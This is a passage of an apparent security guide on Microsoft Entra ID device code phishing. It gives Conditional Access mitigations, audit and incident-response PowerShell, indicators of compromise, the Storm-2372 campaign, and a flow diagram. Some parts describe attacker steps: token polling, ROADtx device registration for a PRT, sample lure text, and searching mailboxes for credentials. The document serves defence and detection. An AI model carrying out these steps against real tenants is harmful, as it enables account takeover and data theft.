        authenticationFlows = @{
            includeAuthenticationFlows = @("deviceCodeFlow")
        }
    }
    grantControls = @{
        operator = "OR"
        builtInControls = @("block")
    }
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $params
```

**Pros:**
- Completely blocks device code phishing at policy enforcement level.
- No false positives; legitimate device code flows are rare.
- Can be scoped to specific users/applications if device code is needed for specific tools.

**Cons:**
- Breaks legitimate CLI tools (e.g., Azure CLI, Graph PowerShell with device code flag).
- Requires identifying and exempting approved applications using device code.

---

**2. Require Multi-Factor Authentication (MFA) for All Users**

MFA does NOT fully prevent device code phishing (victims will still enter MFA codes), but combined with other controls, it raises the bar.

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Require MFA for All Users`
4. **Assignments:** All users
5. **Target resources:** All cloud apps
6. **Access controls:**
   - **Grant:** Require multi-factor authentication
7. Click **Create** (enable immediately; this is a standard control)

**Manual Steps (PowerShell):**

```powershell
$params = @{
    displayName = "Require MFA for All Users"
    state = "enabled"
    conditions = @{
        users = @{ includeUsers = @("All") }
        applications = @{ includeApplications = @("All") }
    }
    grantControls = @{
        operator = "OR"
        builtInControls = @("mfa")
    }
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $params
```

---

### Priority 2: HIGH

**3. Enforce Compliance Device Requirements**

Many device code phishing attacks target unmanaged or non-compliant devices. Requiring device compliance can mitigate some variants.

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Require Compliant Device`
4. **Assignments:** All users
5. **Target resources:** Sensitive apps (Exchange, Teams, SharePoint)
6. **Conditions:**
   - **Device state:** Mark device as compliant (Intune requirement)
7. **Access controls:**
   - **Grant:** Require device to be marked as compliant
8. Click **Create**

**Note:** Attacker can still register a virtual device via ROADtx and claim compliance; therefore, this control should be combined with device registration auditing (Mitigation #6 below).

---

**4. Monitor and Audit Device Registrations**

Detect suspicious device registration patterns that indicate ROADtx abuse.

**PowerShell Command:**

```powershell
Connect-MgGraph -Scopes "AuditLog.Read.All"

# Find newly registered devices
Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Add device'" -Top 100 | `
  Select-Object CreatedDateTime, InitiatedByAppId, TargetResources | `
  Where-Object { $_.CreatedDateTime -gt (Get-Date).AddDays(-7) } | `
  Export-Csv -Path "C:\Audit\new_devices.csv"
```

**What to Look For:**

- Device registrations initiated by "Device Registration Service" (suspicious if initiated by users).
- Multiple device registrations in rapid succession from same IP/session.
- Device registrations from unusual geographic locations.
- Devices with OS version `10.0.19041.928` (hardcoded in ROADtx).

---

**5. Enable Sign-In Risk Policies**

Microsoft Entra ID Protection can detect risky sign-in patterns (impossible travel, atypical locations, etc.).

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Security** → **Identity Protection** → **Sign-in risk policy**
2. **Name:** `Sign-in Risk Policy`
3. **Assignments:** All users
4. **Risk level:**
   - **Low and above:** Block OR Require MFA
   - **Medium and above:** Block OR Require MFA
   - **High:** Block
5. Click **Create**

---

**6. Review Registered Applications and Permissions**

Audit which applications have been granted permission to access Graph API and other sensitive resources.

**PowerShell Command:**

```powershell
Connect-MgGraph -Scopes "Application.Read.All"

# List all OAuth2 permission grants
Get-MgOauth2PermissionGrant -All | `
  Select-Object ClientAppDisplayName, PrincipalDisplayName, Scope | `
  Where-Object { $_.Scope -like "*Mail.Read*" -or $_.Scope -like "*offline_access*" } | `
  Export-Csv -Path "C:\Audit\risky_permissions.csv"

# Review and remove suspicious grants
Remove-MgOauth2PermissionGrant -OAuth2PermissionGrantId "<GRANT_ID>"
```

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Azure/Entra ID IOCs:**

- Device code flows originating from unexpected client IDs (especially `04b07795-8ddb-461a-bbee-02f9e1bf7b46` Graph PowerShell, `29d9ed98-a469-4536-ade2-f981bc1d605e` Auth Broker).
- Multiple failed device code authentication attempts followed by success for same user.
- Device code flows immediately followed by Graph API access within minutes.
- Device registrations with hardcoded OS version `10.0.19041.928` (ROADtx signature).
- Refresh token usage by Microsoft Authentication Broker targeting Device Registration Service.
- PRT acquisition and usage from unusual geographic locations or IPs.

**Phishing Indicators:**

- Emails or Teams messages with links to `microsoft.com/devicelogin` paired with 8-character codes.
- Urgent/threatening language about account verification or security updates.
- Sender impersonation (display name mismatch with email address).
- Messages asking user to "enter a code" without specifying the application or purpose.

### Forensic Artifacts

**Cloud/Azure:**

- **Sign-In Logs (Entra ID):** SignInLogs table; filter by `authenticationProtocol == "deviceCode"` and `ResultSignInStatus == "0"` (successful).
- **Audit Logs:** AuditLogs table; events like "Add device", "Add registered owner to device", "Add OAuth2PermissionGrant".
- **Graph Activity Logs:** CloudAppEvents table; queries for `/me/messages`, `/sites`, `/teams`.
- **Unified Audit Log (M365):** Compliance Portal; Operation like "Consent to application", "Add service principal".

**On-Premises (If Hybrid):**

- **Active Directory Logs:** Device objects created in `CN=RegisteredDevices` container (if hybrid joined).
- **Kerberos Logs:** No direct evidence; device registration is cloud-only.

### Response Procedures

**Immediate Actions (0-15 minutes):**

1. **Revoke User Sessions:**

```powershell
# Revoke all refresh tokens and active sessions for compromised user
Connect-MgGraph -Scopes "UserAuthenticationMethod.ReadWrite.All"

# Force re-authentication
Revoke-MgUserSignInSession -UserId "alice@company.com"
```

2. **Reset User Password:**

```powershell
# Force password reset on next sign-in
Update-MgUser -UserId "alice@company.com" -ForceChangePasswordNextSignIn $true
```

3. **Revoke OAuth Permissions:**

```powershell
# Remove all OAuth2 permission grants for the compromised user
Get-MgOauth2PermissionGrant -All | `
  Where-Object { $_.PrincipalDisplayName -eq "alice@company.com" } | `
  ForEach-Object { Remove-MgOauth2PermissionGrant -OAuth2PermissionGrantId $_.Id }
```

4. **Disable Compromised Device (if registered via ROADtx):**

```powershell
# Find and disable the malicious device
$maliciousDevice = Get-MgDevice -Filter "displayName eq 'DESKTOP-MALICIOUS'"

if ($maliciousDevice) {
    Update-MgDevice -DeviceId $maliciousDevice.Id -AccountEnabled $false
}
```

**Containment (15-60 minutes):**

5. **Investigate Exfiltrated Data:**

```powershell
# Check what was accessed via Graph API
Search-UnifiedAuditLog -StartDate (Get-Date).AddHours(-4) `
  -UserIds "alice@company.com" `
  -Operations "Get user mail items", "Get OneDrive items", "Get Teams" | `
  Export-Csv -Path "C:\Audit\exfiltration_activity.csv"
```

6. **Monitor for Lateral Movement:**

```powershell
# Search for phishing emails sent from compromised account to other users
Get-TransportRule | Where-Object { $_.Name -like "*Device Code*" }

# Review sent items folder for suspicious emails
Search-UnifiedAuditLog -UserIds "alice@company.com" -Operations "Send"
```

7. **Revoke Suspicious Device:**

```powershell
# Disable the registered device to prevent further PRT usage
$device = Get-MgDevice -Filter "displayName eq 'DESKTOP-MALICIOUS'" -ErrorAction SilentlyContinue

if ($device) {
    Update-MgDevice -DeviceId $device.Id -AccountEnabled $false
    Write-Host "[+] Malicious device disabled: $($device.Id)"
}
```

**Recovery (1-24 hours):**

8. **Analyze and Patch:**

- Review all Conditional Access policies; ensure device code flow is blocked.
- Audit all registered devices for suspicious entries.
- Implement mandatory MFA for all users.
- Conduct threat hunt for similar compromise patterns (other victims).

9. **Communicate with Users:**

```
Subject: Account Security Incident - Action Required

We detected suspicious activity on your account (device code phishing attack). 

Your account has been secured:
✓ All sessions revoked
✓ Password reset required on next sign-in
✓ OAuth permissions reviewed

No action required from you at this time. If you notice any unusual activity, contact IT immediately.
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | **[IA-PHISH-001]** | **Device Code Phishing — attacker tricks user into entering device code** |
| **2** | **Credential Access** | T1110.004 (Brute Force - Credential Stuffing) or T1056.004 (Keylogging) | Attacker searches emails for passwords, credentials, admin details |
| **3** | **Persistence** | IA-PHISH-002 / OAuth App Registration | Attacker registers malicious OAuth app with broad permissions OR uses device registration + PRT |
| **4** | **Defense Evasion** | T1562.008 (Disable or Modify Cloud Logs) | If attacker gains admin access, they delete/modify sign-in logs to cover tracks |
| **5** | **Lateral Movement** | IA-PHISH-005 (Internal Spearphishing) | Attacker uses compromised account to send device code phishing to other users |
| **6** | **Impact** | T1537 (Transfer Data to Cloud Account) | Attacker exfiltrates sensitive files, emails, and collaboration data |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: Storm-2372 Campaign (Feb 2025)

**Attribution:** Russian state-backed threat group (assessed as aligning with Russian government interests)

**Target:** Government agencies, NGOs, IT services providers, defense contractors, telecommunications, health, education, energy sectors across Europe, North America, Africa, Middle East

**Timeline:** Active since **August 2024**, ongoing as of **February 2025**

**Attack Methodology:**

1. Reconnaissance: Identify target organizations and key personnel via LinkedIn, public databases.
2. Social Engineering: Contact targets via Teams, WhatsApp, or Signal, impersonating executives or colleagues.
3. Phishing: Send message with device code and link to `microsoft.com/devicelogin`: *"You're invited to a meeting, enter this code: G7QJ-P9T3"*
4. Token Theft: Once victim enters code, attacker polls for tokens and gains access to mailbox.
5. Exfiltration: Search emails for keywords (`password`, `admin`, `credentials`, `secret`, `teamviewer`, `anydesk`).
6. Lateral Movement: Send internal phishing emails from victim's account to other users with device code requests.
7. Persistence (Updated Feb 14, 2025): Switch to Microsoft Authentication Broker client ID to register device, acquire PRT, and maintain long-term access.

**Detected by:**

- Microsoft Threat Intelligence
- Volexity security research
- Multiple vendor detections (Proofpoint, Wiz, Red Canary)

**Impact:**

- Government agencies across multiple countries compromised
- Credential harvesting enabled further lateral movement
- Email exfiltration of sensitive state/defense information
- **Success Rate:** Far higher than traditional spearphishing over extended period

**References:**

- [Microsoft Security Blog - Storm-2372 Device Code Phishing](https://www.microsoft.com/en-us/security/blog/2025/02/13/storm-2372-conducts-device-code-phishing-campaign/)
- [Volexity - Multiple Russian Threat Actors Targeting Device Code](https://www.volexity.com/blog/2025/02/13/multiple-russian-threat-actors-targeting-microsoft-device-code-authentication/)

---

### Example 2: Proofpoint Tracking (Jan-Feb 2025)

**Threat Actors:** Multiple state-aligned groups (Russia-aligned dominant, suspected China-aligned also active)

**Target:** Espionage campaigns against government, defense, technology sectors

**Technique Variant:** Attackers using residential proxies geographically aligned with target regions to further evade detection

**Indicators:** High volume of device code flow usage from unexpected geolocations; emails with urgency and executive impersonation

**References:**

- [Proofpoint - Device Code Phishing for Account Takeover](https://www.proofpoint.com/us/blog/threat-insight/access-granted-phishing-device-code-authorization-account-takeover)

---

## 13. APPENDIX: Device Code Flow Architecture (Reference)

```
┌─────────────────────────────────────────────────────────────────────┐
│                    DEVICE CODE FLOW (RFC 8628)                      │
└─────────────────────────────────────────────────────────────────────┘

ATTACKER'S DEVICE               VICTIM'S BROWSER                  MICROSOFT ENTRA ID
   (Linux)                        (Chrome)                          (Cloud)
      │                              │                                  │
      │                              │                                  │
      ├──────────────────────────────────────────────────────────────>│
      │ (1) POST /devicecode                                           │
      │     client_id=<PUBLIC_ID>                                      │
      │     scope=https://graph.microsoft.com/.default                │
      │                                                                │
      │<──────────────────────────────────────────────────────────────┤
      │ (2) Response: device_code, user_code, verification_uri        │
      │                                                                │
      ├─────────────────────────────────────────────────────────────> │
      │ (3) [PHISHING EMAIL]                                          │
      │ "Enter code G7QJ-P9T3 on https://microsoft.com/devicelogin"  │
      │                                                                │
      │                              ├───────────────────────────────>│
      │                              │ (4) Open browser, navigate to  │
      │                              │ microsoft.com/devicelogin      │
      │                              │                                │
      │                              │<───────────────────────────────┤
      │                              │ (5) Enter user_code (G7QJ-P9T3)│
      │                              │                                │
      │                              ├───────────────────────────────>│
      │                              │ (6) Entra ID validates code    │
      │                              │ Shows: "Do you want to sign in?" 
      │                              │                                │
      │                              │ (7) Victim clicks "Yes" and    │
      │                              │ authenticates (password + MFA) │
      │                              │                                │
      │<──────────────────────────────────────────────────────────────┤
      │ (8) device_code becomes valid; polling returns tokens         │
      │                                                                │
      ├──────────────────────────────────────────────────────────────>│
      │ (9) POST /token (polling)                                     │
      │     grant_type=device_code                                    │
      │     device_code=<SECRET>                                      │
      │                                                                │
      │<──────────────────────────────────────────────────────────────┤
      │ (10) Response: access_token, refresh_token, id_token          │
      │                                                                │
      ├─────────────────────────────────────────────────────────────> │
      │ (11) GET /me/messages                                         │
      │ Authorization: Bearer <access_token>                          │
      │                                                                │
      │<──────────────────────────────────────────────────────────────┤
      │ (12) Response: Victim's emails, files, Teams data             │
      │                                                                │
      ✓ ATTACKER NOW HAS ACCESS TO VICTIM'S MAILBOX                   │
        (No malware, no phishing portal, no intercepted credentials)   │

```

---
